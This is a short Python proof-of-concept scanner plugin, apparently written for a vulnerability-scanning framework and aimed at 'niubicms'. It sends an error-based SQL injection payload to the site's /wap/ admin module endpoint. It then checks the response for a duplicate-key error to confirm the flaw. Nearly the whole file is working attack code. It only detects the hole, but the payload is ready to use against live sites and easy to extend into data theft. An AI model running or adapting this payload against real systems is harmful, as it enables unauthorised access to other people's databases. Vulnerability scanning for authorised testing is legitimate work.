#!/usr/bin/env python
# -*- coding: utf-8 -*-

def assign(service,arg):
    if service == "niubicms":
    	return True, arg

def audit(arg):
	payload = "/wap/?action=show&mod=admin%20where%20userid=1%20and%20%28select%201%20from%20%28select%20count%28*%29,concat%281,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29--"
	code, head, res, errcode,finalurl =  curl.curl("\"%s\"" % (arg + payload))

	if code == 200:
		if "for key 'group_key'" in res:
			security_hole('find sql injection: ' + arg+payload)

if __name__ == "__main__":
	from dummy import *
	audit(assign('niubicms', 'http://www.example.com/')[1])